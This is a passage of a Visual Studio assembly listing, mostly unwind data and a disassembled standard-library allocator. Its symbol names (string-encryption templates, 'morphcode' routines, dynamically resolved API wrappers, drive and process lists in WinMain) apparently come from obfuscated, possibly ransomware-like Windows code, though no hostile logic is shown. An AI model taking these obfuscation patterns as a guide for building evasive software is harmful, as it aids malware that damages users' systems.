$unwind$??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0131H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	02d5H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?HandleCommandLine@@YAHPEA_W@Z DD 025053d19H
	DD	010e2313H
	DD	070070083H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0408H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?HandleCommandLine@@YAHPEA_W@Z$rtcName$0 DB 041H	; HandleCommandLine
	DB	072H
	DB	067H
	DB	063H
	DB	00H
	ORG $+11
?HandleCommandLine@@YAHPEA_W@Z$rtcVarDesc DD 024H	; HandleCommandLine
	DD	04H
	DQ	FLAT:?HandleCommandLine@@YAHPEA_W@Z$rtcName$0
	ORG $+48
?HandleCommandLine@@YAHPEA_W@Z$rtcFrameData DD 01H	; HandleCommandLine
	DD	00H
	DQ	FLAT:?HandleCommandLine@@YAHPEA_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ConvertSizeStr@@YAHPEA_W@Z DD 045051301H
	DD	010e4313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z DD 025051c01H
	DD	0117231cH
	DD	070100021H
	DD	0500fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z DD 025051c01H
	DD	0117231cH
	DD	070100021H
	DD	0500fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SToI@@YAHPEAD@Z DD 025051301H
	DD	010e2313H
	DD	070070035H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fg_Path@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Eg_Path@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01bH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?morphcode@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030021H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?morphcode@@YAXPEAX@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	01eH
	DW	025H
	DW	03fH
	DW	046H
	DW	049H
	DW	05bH
	DW	060H
	DW	06aH
	DW	082H
	DW	089H
	DW	08cH
	DW	09dH
	DW	0a2H
	DW	0acH
	DW	0beH
	DW	0d0H
	DW	0d3H
	DW	0e2H
	DW	0f3H
	DW	0f8H
	DW	0fdH
	DW	0102H
	DW	0109H
	DW	011aH
	DW	012cH
	DW	012fH
	DW	0140H
	DW	0151H
	DW	0156H
	DW	015bH
	DW	0160H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?morphcode@@YAXH@Z DD 025051201H
	DD	010d2312H
	DD	070060021H
	DD	05005H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z DD 045052001H
	DD	011b4320H
	DD	070140025H
	DD	05013H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcmpiW@@YAHPEB_W0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z DD 025051c01H
	DD	0117231cH
	DD	070100021H
	DD	0500fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetCommandLineW@@YAPEA_WXZ DD 025050f01H
	DD	010a230fH
	DD	070030021H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWaitForSingleObject@@YAKPEAXK@Z DD 025051701H
	DD	01122317H
	DD	0700b0021H
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrlenW@@YAHPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
	DB	0f6H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD 025054719H
	DD	0118231dH
	DD	070110025H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0118H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DB	04dH
	DB	061H
	DB	073H
	DB	06bH
	DB	065H
	DB	064H
	DB	00H
	ORG $+8
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	08H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcName$0
	ORG $+48
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	DD	00H
	DQ	FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	036H
	DB	0c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD 025053d19H
	DD	010e2313H
	DD	070070031H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0178H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DB	041H
	DB	06cH
	DB	06cH
	DB	06fH
	DB	063H
	DB	05fH
	DB	06dH
	DB	061H
	DB	078H
	DB	00H
	ORG $+5
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc DD 028H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	08H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcName$0
	ORG $+48
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData DD 01H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	DD	00H
	DQ	FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	070110029H
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c0025H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$allocator@_W@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Orphan_all@_Container_base0@std@@QEAAXXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c002dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 025050f01H
	DD	010a230fH
	DD	070030023H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_array_new_length@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1bad_alloc@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@AEAA@QEBD@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?what@exception@std@@UEBAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	07007001fH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1exception@std@@UEAA@XZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@QEBDH@Z DD 025051d01H
	DD	0118231dH
	DD	07011001dH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?max@?$numeric_limits@_J@std@@SA_JXZ DD 025050f01H
	DD	010a230fH
	DD	07003001dH
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??2@YAPEAX_KPEAX@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	03c9H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$WinMain DD 025054c19H
	DD	011d2322H
	DD	07016007bH
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	03c8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
WinMain$rtcName$0 DB 044H
	DB	072H
	DB	069H
	DB	076H
	DB	065H
	DB	04cH
	DB	069H
	DB	073H
	DB	074H
	DB	00H
	ORG $+6
WinMain$rtcName$1 DB 053H
	DB	079H
	DB	073H
	DB	074H
	DB	065H
	DB	06dH
	DB	049H
	DB	06eH
	DB	066H
	DB	06fH
	DB	00H
	ORG $+5
WinMain$rtcName$2 DB 050H
	DB	069H
	DB	064H
	DB	04cH
	DB	069H
	DB	073H
	DB	074H
	DB	00H
	ORG $+8
WinMain$rtcVarDesc DD 0108H
	DD	010H
	DQ	FLAT:WinMain$rtcName$2
	DD	098H
	DD	030H
	DQ	FLAT:WinMain$rtcName$1
	DD	028H
	DD	010H
	DQ	FLAT:WinMain$rtcName$0
	ORG $+144
WinMain$rtcFrameData DD 03H
	DD	00H
	DQ	FLAT:WinMain$rtcVarDesc
CONST	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Block_size$ = 8
_Ptr_container$ = 40
_Ptr$ = 72
_Bytes$ = 320
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z PROC ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>, COMDAT

; 140  : __declspec(allocator) void* _Allocate_manually_vector_aligned(const size_t _Bytes) {

$LN12:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 141  :     // allocate _Bytes manually aligned to at least _Big_allocation_alignment
; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00026	48 83 c0 27	 add	 rax, 39			; 00000027H
  0002a	48 89 45 08	 mov	 QWORD PTR _Block_size$[rbp], rax

; 143  :     if (_Block_size <= _Bytes) {

  0002e	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  00035	48 39 45 08	 cmp	 QWORD PTR _Block_size$[rbp], rax
  00039	77 05		 ja	 SHORT $LN8@Allocate_m

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0003b	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN8@Allocate_m:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  00040	48 8b 4d 08	 mov	 rcx, QWORD PTR _Block_size$[rbp]
  00044	e8 00 00 00 00	 call	 ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
  00049	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax
$LN4@Allocate_m:

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0004d	48 83 7d 28 00	 cmp	 QWORD PTR _Ptr_container$[rbp], 0
  00052	74 02		 je	 SHORT $LN9@Allocate_m
  00054	eb 0b		 jmp	 SHORT $LN10@Allocate_m
$LN9@Allocate_m:
$LN7@Allocate_m:
  00056	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0005b	33 c0		 xor	 eax, eax
  0005d	85 c0		 test	 eax, eax
  0005f	75 f5		 jne	 SHORT $LN7@Allocate_m
$LN10@Allocate_m:
  00061	33 c0		 xor	 eax, eax
  00063	85 c0		 test	 eax, eax
  00065	75 e6		 jne	 SHORT $LN4@Allocate_m

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00067	48 8b 45 28	 mov	 rax, QWORD PTR _Ptr_container$[rbp]
  0006b	48 83 c0 27	 add	 rax, 39			; 00000027H
  0006f	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H
  00073	48 89 45 48	 mov	 QWORD PTR _Ptr$[rbp], rax

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00077	b8 08 00 00 00	 mov	 eax, 8
  0007c	48 6b c0 ff	 imul	 rax, rax, -1
  00080	48 8b 4d 48	 mov	 rcx, QWORD PTR _Ptr$[rbp]
  00084	48 8b 55 28	 mov	 rdx, QWORD PTR _Ptr_container$[rbp]
  00088	48 89 14 01	 mov	 QWORD PTR [rcx+rax], rdx

; 151  : 
; 152  : #ifdef _DEBUG
; 153  :     static_cast<uintptr_t*>(_Ptr)[-2] = _Big_allocation_sentinel;
; 154  : #endif // defined(_DEBUG)
; 155  :     return _Ptr;

  0008c	48 8b 45 48	 mov	 rax, QWORD PTR _Ptr$[rbp]
$LN11@Allocate_m:

; 156  : }

  00090	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  00097	5f		 pop	 rdi
  00098	5d		 pop	 rbp
  00099	c3		 ret	 0
??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ENDP ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
